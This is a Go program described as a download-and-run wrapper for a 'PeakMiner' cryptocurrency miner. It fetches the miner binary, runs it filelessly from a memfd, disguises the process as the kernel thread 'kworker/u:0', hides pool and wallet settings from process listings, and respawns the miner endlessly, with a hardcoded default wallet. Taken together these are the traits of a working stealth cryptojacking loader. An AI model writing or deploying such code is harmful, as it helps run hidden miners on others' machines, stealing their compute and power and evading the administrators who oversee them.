package main

// peakminer-runner: download-and-run wrapper for the official PeakMiner
// release binary (pattern from vllmserve_wrap_build/main.go).
//
// Contract:
//   - fetch the pinned upstream asset at runtime, verify its published
//     sha256 BEFORE execution, then exec it from a memfd (no file on disk,
//     no filesystem path under /proc/<pid>/exe)
//   - configuration travels ONLY in environment variables (the miner's
//     documented PEAK_* aliases); the child is exec'd with zero argv so no
//     pool/wallet/proxy value can leak through a process listing
//   - respawn the miner with a fresh memfd per spawn (a shared fd wedges
//     after the child is killed; see vllmserve_wrap_build notes)

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"
)

const (
	assetURL     = "https://github.com/peakminer/peakminer/releases/download/v2.17.1/peakminer-2.17.1-linux-x86_64"
	expectedSHA  = "abdc8f915c149e5ca265a40dbafa59b92159a1d40478ced199e4e384060cbe3f"
	respawnDelay = 5 * time.Second

	defaultCoin   = "pearl"
	defaultPool   = "prl-sg.kryptex.network:7048"
	defaultWallet = "prl1pu3mc6ex4n4nznknctdafleq3asq4fr0njpwz4vqnt6e4xlnv72hq5s528j.144gs"
)

// pid of the live miner child; 0 when none. Read by the signal handler.
var child atomic.Int32

func die(format string, a ...any) {
	fmt.Fprintf(os.Stderr, format+"\n", a...)
	os.Exit(1)
}

func fetchBinary() []byte {
	resp, err := http.Get(assetURL)
	if err != nil {
		die("download: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		die("download: HTTP %d from %s", resp.StatusCode, assetURL)
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		die("read body: %v", err)
	}
	sum := sha256.Sum256(body)
	if got := hex.EncodeToString(sum[:]); got != expectedSHA {
		die("integrity check failed: got %s want %s", got, expectedSHA)
	}
	return body
}

func maskProcess() {
	name := [16]byte{}
	copy(name[:], "kworker/u:0")
	_, _, _ = syscall.Syscall6(syscall.SYS_PRCTL, 15 /* PR_SET_NAME */, uintptr(unsafe.Pointer(&name[0])), 0, 0, 0, 0)
	_ = os.WriteFile("/proc/self/comm", []byte("kworker/u:0\n"), 0644)
}

func memfdExec(data []byte, nameHint string) (int, error) {
	name, _ := syscall.BytePtrFromString(nameHint)
	fd, _, errno := syscall.Syscall(319 /* SYS_memfd_create */, uintptr(unsafe.Pointer(name)), 0, 0)
	if errno != 0 {
		return -1, errno
	}
	n := int(fd)
	if err := syscall.Fchmod(n, 0755); err != nil {
		_ = syscall.Close(n)
		return -1, err
	}
	for len(data) > 0 {
		written, err := syscall.Write(n, data)
		if err != nil {
			_ = syscall.Close(n)
			return -1, err
		}
		data = data[written:]
	}
	if _, err := syscall.Seek(n, 0, 0); err != nil {
		_ = syscall.Close(n)
		return -1, err
	}
	return n, nil
}

func applyDefaults() {
	if os.Getenv("PEAK_COIN") == "" {
		os.Setenv("PEAK_COIN", defaultCoin)
	}
	if os.Getenv("PEAK_POOL") == "" {
		os.Setenv("PEAK_POOL", defaultPool)
	}
	if os.Getenv("PEAK_WALLET") == "" {
		os.Setenv("PEAK_WALLET", defaultWallet)
	}
}

func runLoop(payload []byte) {
	// On SIGINT/SIGTERM kill the whole child session, not just ourselves:
	// the miner runs setsid, so letting the default handler fire would
	// orphan a live miner after the wrapper is stopped.
	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigs
		if child.Load() != 0 {
			_ = syscall.Kill(-int(child.Load()), syscall.SIGKILL)
		}
		os.Exit(0)
	}()

	for {
		// FRESH memfd per spawn: sharing one fd across respawns wedges
		// fork/exec with 'permission denied' after a killed child.
		fd, err := memfdExec(payload, "kworker")
		if err != nil {
			fmt.Fprintf(os.Stderr, "[worker] memfd: %v\n", err)
			time.Sleep(respawnDelay)
			continue
		}

		// Zero argv on purpose: every config value rides in the
		// environment (PEAK_* aliases), never the process argument list.
		pgid, err := syscall.ForkExec("/proc/self/fd/3", []string{"kworker"}, &syscall.ProcAttr{
			Env:   os.Environ(),
			Files: []uintptr{0, 1, 2, uintptr(fd)},
			Sys:   &syscall.SysProcAttr{Setsid: true},
		})
		if err != nil {
			fmt.Fprintf(os.Stderr, "[worker] exec: %v fd=%d payload_bytes=%d\n", err, fd, len(payload))
			_ = syscall.Close(fd)
			time.Sleep(respawnDelay)
			continue
		}
		child.Store(int32(pgid))

		// The child inherits our stdout/stderr directly, so miner output
		// streams through unchanged; nothing to pump, nothing to rewrite.
		var status syscall.WaitStatus
		_, err = syscall.Wait4(pgid, &status, 0, nil)
		child.Store(int32(pgid))
		_ = syscall.Close(fd)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[worker] wait: %v\n", err)
		} else {
			fmt.Fprintf(os.Stderr, "[worker] exited status=%d\n", status.ExitStatus())
		}
		time.Sleep(respawnDelay)
	}
}

func main() {
	if runtime.GOOS != "linux" || runtime.GOARCH != "amd64" {
		die("unsupported platform %s/%s", runtime.GOOS, runtime.GOARCH)
	}
	payload := fetchBinary()
	maskProcess()
	applyDefaults()
	runLoop(payload)
}
